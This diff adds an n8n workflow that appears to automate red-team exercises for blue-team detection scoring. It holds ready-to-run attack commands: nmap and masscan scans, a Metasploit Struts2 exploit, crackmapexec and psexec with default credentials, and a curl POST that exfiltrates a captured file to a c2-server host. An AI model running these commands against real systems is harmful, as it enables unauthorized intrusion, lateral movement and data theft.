@@ -1,0 +1,300 @@
+{
+  "name": "Red Team Attack Automation",
+  "nodes": [
+    {
+      "parameters": {
+        "path": "red-team/attack",
+        "method": "POST",
+        "responseMode": "responseNode",
+        "options": {}
+      },
+      "id": "webhook-trigger",
+      "name": "Webhook - Trigger Attack",
+      "type": "n8n-nodes-base.webhook",
+      "typeVersion": 1,
+      "position": [250, 400],
+      "webhookId": "red-team-attack"
+    },
+    {
+      "parameters": {
+        "jsCode": "// Parse attack scenario from webhook\nconst scenario = $input.item.json.body.scenario || 'reconnaissance';\nconst exerciseId = $input.item.json.body.exercise_id;\nconst target = $input.item.json.body.target || '10.0.30.0/24';\nconst intensity = $input.item.json.body.intensity || 'medium';\n\n// Attack phases\nconst attackPhases = {\n  reconnaissance: {\n    order: 1,\n    tools: ['nmap', 'masscan', 'amass'],\n    stealth: 'loud',\n    expected_detection: true,\n    commands: [\n      `nmap -sV -O -oJ /tmp/recon-${exerciseId}.json ${target}`,\n      `masscan ${target} -p1-65535 --rate=1000`,\n      `amass enum -passive -d ${target}`\n    ]\n  },\n  vulnerability_scan: {\n    order: 2,\n    tools: ['nuclei', 'nikto'],\n    stealth: 'normal',\n    expected_detection: true,\n    commands: [\n      `nuclei -target ${target} -json -output /tmp/vulns-${exerciseId}.json`,\n      `nikto -host ${target} -output /tmp/nikto-${exerciseId}.txt`\n    ]\n  },\n  exploitation: {\n    order: 3,\n    tools: ['metasploit', 'sqlmap', 'burpsuite'],\n    stealth: 'normal',\n    expected_detection: true,\n    commands: [\n      `msfconsole -q -x \"use exploit/multi/http/struts2_content_type_ognl; set RHOST ${target}; exploit\"`\n    ]\n  },\n  post_exploitation: {\n    order: 4,\n    tools: ['empire', 'mimikatz', 'bloodhound'],\n    stealth: 'stealthy',\n    expected_detection: false,\n    commands: [\n      `python3 /opt/empire/empire --rest --headless`,\n      `/opt/bloodhound/bloodhound-python -c All -d ${target}`\n    ]\n  },\n  lateral_movement: {\n    order: 5,\n    tools: ['impacket', 'crackmapexec'],\n    stealth: 'stealthy',\n    expected_detection: false,\n    commands: [\n      `crackmapexec smb ${target} -u admin -p password --shares`,\n      `python3 /opt/impacket/psexec.py admin@${target}`\n    ]\n  },\n  data_exfiltration: {\n    order: 6,\n    tools: ['custom'],\n    stealth: 'ninja',\n    expected_detection: false,\n    commands: [\n      `curl -X POST https://c2-server.local/exfil -F \"data=@/tmp/captured-flag.txt\"`\n    ]\n  }\n};\n\nconst phase = attackPhases[scenario] || attackPhases.reconnaissance;\n\nreturn {\n  json: {\n    exercise_id: exerciseId,\n    scenario: scenario,\n    phase: phase,\n    target: target,\n    intensity: intensity,\n    timestamp: new Date().toISOString(),\n    red_team_signature: `REDTEAM-${exerciseId}`,\n    user_agent: `RedTeam/${exerciseId}`\n  }\n};"
+      },
+      "id": "parse-scenario",
+      "name": "Parse Attack Scenario",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [450, 400]
+    },
+    {
+      "parameters": {
+        "conditions": {
+          "string": [
+            {
+              "value1": "={{ $json.scenario }}",
+              "operation": "equals",
+              "value2": "reconnaissance"
+            }
+          ]
+        }
+      },
+      "id": "route-reconnaissance",
+      "name": "Route: Reconnaissance",
+      "type": "n8n-nodes-base.switch",
+      "typeVersion": 1,
+      "position": [650, 400]
+    },
+    {
+      "parameters": {
+        "command": "=ssh root@10.0.10.110 'export EXERCISE_ID={{ $json.exercise_id }} && export USER_AGENT={{ $json.user_agent }} && nmap -sV -O --script-args http.useragent={{ $json.user_agent }} -oJ /tmp/recon-{{ $json.exercise_id }}.json {{ $json.target }}'",
+        "options": {}
+      },
+      "id": "execute-recon",
+      "name": "Execute: Nmap Scan",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [850, 200]
+    },
+    {
+      "parameters": {
+        "command": "=ssh root@10.0.10.110 'nuclei -target {{ $json.target }} -json -output /tmp/vulns-{{ $json.exercise_id }}.json -header \"User-Agent: {{ $json.user_agent }}\"'",
+        "options": {}
+      },
+      "id": "execute-vuln-scan",
+      "name": "Execute: Vulnerability Scan",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [850, 300]
+    },
+    {
+      "parameters": {
+        "command": "=ssh root@10.0.10.110 '/opt/red-team/exploit-runner.sh {{ $json.exercise_id }} {{ $json.target }}'",
+        "options": {}
+      },
+      "id": "execute-exploit",
+      "name": "Execute: Exploitation",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [850, 400]
+    },
+    {
+      "parameters": {
+        "command": "=ssh root@10.0.10.110 '/opt/red-team/post-exploit.sh {{ $json.exercise_id }} {{ $json.target }}'",
+        "options": {}
+      },
+      "id": "execute-post-exploit",
+      "name": "Execute: Post-Exploitation",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [850, 500]
+    },
+    {
+      "parameters": {
+        "command": "=ssh root@10.0.10.110 '/opt/red-team/lateral-movement.sh {{ $json.exercise_id }} {{ $json.target }}'",
+        "options": {}
+      },
+      "id": "execute-lateral",
+      "name": "Execute: Lateral Movement",
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [850, 600]
+    },
+    {
+      "parameters": {
+        "jsCode": "// Collect and parse results from attack\nconst exerciseId = $('Parse Attack Scenario').item.json.exercise_id;\nconst scenario = $('Parse Attack Scenario').item.json.scenario;\nconst commandOutput = $input.item.json.stdout || '';\n\n// Parse results based on scenario\nlet results = {\n  exercise_id: exerciseId,\n  scenario: scenario,\n  timestamp: new Date().toISOString(),\n  success: false,\n  objectives_achieved: [],\n  detected: false,\n  artifacts: [],\n  scoring: 0\n};\n\n// Check if attack was successful based on output\nif (commandOutput.includes('vulnerable') || commandOutput.includes('SUCCESS')) {\n  results.success = true;\n  results.objectives_achieved.push(scenario);\n  \n  // Award points based on scenario\n  const points = {\n    reconnaissance: 100,\n    vulnerability_scan: 150,\n    exploitation: 300,\n    post_exploitation: 400,\n    lateral_movement: 500,\n    data_exfiltration: 500\n  };\n  \n  results.scoring = points[scenario] || 0;\n}\n\n// Extract any captured flags\nconst flagMatch = commandOutput.match(/FLAG\\{([^}]+)\\}/);\nif (flagMatch) {\n  results.artifacts.push({\n    type: 'flag',\n    value: flagMatch[0],\n    location: 'captured'\n  });\n  results.scoring += 500;  // Bonus for flag capture\n}\n\nreturn { json: results };"
+      },
+      "id": "collect-results",
+      "name": "Collect Attack Results",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [1050, 400]
+    },
+    {
+      "parameters": {
+        "url": "={{ $env.WAZUH_API_URL }}/security/alerts",
+        "authentication": "genericCredentialType",
+        "genericAuthType": "httpHeaderAuth",
+        "sendHeaders": true,
+        "headerParameters": {
+          "parameters": [
+            {
+              "name": "Authorization",
+              "value": "=Bearer {{ $env.WAZUH_API_TOKEN }}"
+            }
+          ]
+        },
+        "sendQuery": true,
+        "queryParameters": {
+          "parameters": [
+            {
+              "name": "data.srcip",
+              "value": "10.0.10.110"
+            },
+            {
+              "name": "time_range",
+              "value": "5m"
+            }
+          ]
+        },
+        "options": {}
+      },
+      "id": "check-detection",
+      "name": "Check If Detected (Wazuh)",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 3,
+      "position": [1250, 400]
+    },
+    {
+      "parameters": {
+        "jsCode": "// Check if Blue Team detected us\nconst alerts = $input.item.json.data?.affected_items || [];\nconst results = $('Collect Attack Results').item.json;\n\nif (alerts.length > 0) {\n  results.detected = true;\n  results.detection_time = alerts[0].timestamp;\n  results.detected_by_rule = alerts[0].rule.id;\n  \n  // Subtract stealth points if detected\n  results.scoring -= 50;\n}\n\nreturn { json: results };"
+      },
+      "id": "update-detection-status",
+      "name": "Update Detection Status",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [1450, 400]
+    },
+    {
+      "parameters": {
+        "resource": "file",
+        "operation": "append",
+        "fileName": "=/data/exercises/{{ $json.exercise_id }}-red-team.jsonl",
+        "fileContent": "={{ JSON.stringify($json) }}\\n",
+        "options": {}
+      },
+      "id": "log-results",
+      "name": "Log Results to File",
+      "type": "n8n-nodes-base.n8n-nodes-base.file",
+      "typeVersion": 1,
+      "position": [1650, 400]
+    },
+    {
+      "parameters": {
+        "channel": "#red-team",
+        "text": "=🔴 **Red Team Update**\n\n**Exercise:** {{ $json.exercise_id }}\n**Scenario:** {{ $json.scenario }}\n**Status:** {{ $json.success ? '✅ Success' : '❌ Failed' }}\n**Detected:** {{ $json.detected ? '🚨 YES (Blue Team caught us!)' : '✅ NO (Still undetected)' }}\n**Score:** {{ $json.scoring }} points\n\n**Objectives:**\n{{ $json.objectives_achieved.map(o => '✅ ' + o).join('\\n') || 'None achieved yet' }}\n\n{{ $json.artifacts.length > 0 ? '**Captured Flags:** ' + $json.artifacts.length : '' }}",
+        "attachments": []
+      },
+      "id": "notify-red-team",
+      "name": "Notify Red Team Slack",
+      "type": "n8n-nodes-base.slack",
+      "typeVersion": 1,
+      "position": [1850, 400]
+    },
+    {
+      "parameters": {
+        "respondWith": "json",
+        "responseBody": "={{ JSON.stringify($json, null, 2) }}",
+        "options": {}
+      },
+      "id": "webhook-response",
+      "name": "Webhook Response",
+      "type": "n8n-nodes-base.respondToWebhook",
+      "typeVersion": 1,
+      "position": [2050, 400]
+    },
+    {
+      "parameters": {
+        "triggerTimes": {
+          "item": [
+            {
+              "mode": "everyX",
+              "value": 15,
+              "unit": "minutes"
+            }
+          ]
+        }
+      },
+      "id": "automated-attack-schedule",
+      "name": "Automated Attack Schedule",
+      "type": "n8n-nodes-base.scheduleTrigger",
+      "typeVersion": 1,
+      "position": [250, 700]
+    },
+    {
+      "parameters": {
+        "resource": "file",
+        "operation": "read",
+        "filePath": "/data/exercises/*.json",
+        "options": {}
+      },
+      "id": "load-exercises",
+      "name": "Load Active Exercises",
+      "type": "n8n-nodes-base.n8n-nodes-base.file",
+      "typeVersion": 1,
+      "position": [450, 700]
+    },
+    {
+      "parameters": {
+        "jsCode": "// Determine next attack phase based on exercise progress\nconst exercise = $input.item.json;\n\nif (exercise.status !== 'active') {\n  return [];\n}\n\nconst phases = [\n  'reconnaissance',\n  'vulnerability_scan',\n  'exploitation',\n  'post_exploitation',\n  'lateral_movement',\n  'data_exfiltration'\n];\n\n// Read exercise log to see what's been done\nconst currentPhase = exercise.current_phase || 0;\nconst nextPhase = phases[currentPhase] || 'reconnaissance';\n\nreturn {\n  json: {\n    scenario: nextPhase,\n    exercise_id: exercise.exercise_id,\n    target: '10.0.30.0/24',\n    intensity: 'medium'\n  }\n};"
+      },
+      "id": "determine-next-phase",
+      "name": "Determine Next Attack Phase",
+      "type": "n8n-nodes-base.code",
+      "typeVersion": 2,
+      "position": [650, 700]
+    }
+  ],
+  "connections": {
+    "Webhook - Trigger Attack": {
+      "main": [[{ "node": "Parse Attack Scenario", "type": "main", "index": 0 }]]
+    },
+    "Parse Attack Scenario": {
+      "main": [[{ "node": "Route: Reconnaissance", "type": "main", "index": 0 }]]
+    },
+    "Route: Reconnaissance": {
+      "main": [
+        [{ "node": "Execute: Nmap Scan", "type": "main", "index": 0 }],
+        [{ "node": "Execute: Vulnerability Scan", "type": "main", "index": 0 }],
+        [{ "node": "Execute: Exploitation", "type": "main", "index": 0 }],
+        [{ "node": "Execute: Post-Exploitation", "type": "main", "index": 0 }],
+        [{ "node": "Execute: Lateral Movement", "type": "main", "index": 0 }]
+      ]
+    },
+    "Execute: Nmap Scan": {
+      "main": [[{ "node": "Collect Attack Results", "type": "main", "index": 0 }]]
+    },
+    "Execute: Vulnerability Scan": {
+      "main": [[{ "node": "Collect Attack Results", "type": "main", "index": 0 }]]
+    },
+    "Execute: Exploitation": {
+      "main": [[{ "node": "Collect Attack Results", "type": "main", "index": 0 }]]
+    },
+    "Execute: Post-Exploitation": {
+      "main": [[{ "node": "Collect Attack Results", "type": "main", "index": 0 }]]
+    },
+    "Execute: Lateral Movement": {
+      "main": [[{ "node": "Collect Attack Results", "type": "main", "index": 0 }]]
+    },
+    "Collect Attack Results": {
+      "main": [[{ "node": "Check If Detected (Wazuh)", "type": "main", "index": 0 }]]
+    },
+    "Check If Detected (Wazuh)": {
+      "main": [[{ "node": "Update Detection Status", "type": "main", "index": 0 }]]
+    },
+    "Update Detection Status": {
+      "main": [[{ "node": "Log Results to File", "type": "main", "index": 0 }]]
+    },
+    "Log Results to File": {
+      "main": [[{ "node": "Notify Red Team Slack", "type": "main", "index": 0 }]]
+    },
+    "Notify Red Team Slack": {
+      "main": [[{ "node": "Webhook Response", "type": "main", "index": 0 }]]
+    },
+    "Automated Attack Schedule": {
+      "main": [[{ "node": "Load Active Exercises", "type": "main", "index": 0 }]]
+    },
+    "Load Active Exercises": {
+      "main": [[{ "node": "Determine Next Attack Phase", "type": "main", "index": 0 }]]
+    },
+    "Determine Next Attack Phase": {
+      "main": [[{ "node": "Parse Attack Scenario", "type": "main", "index": 0 }]]
+    }
+  },
+  "settings": {
+    "executionOrder": "v1"
+  },
+  "staticData": null,
+  "tags": [],
+  "triggerCount": 0,
+  "updatedAt": "2025-12-09T00:00:00.000Z",
+  "versionId": "1"
+}
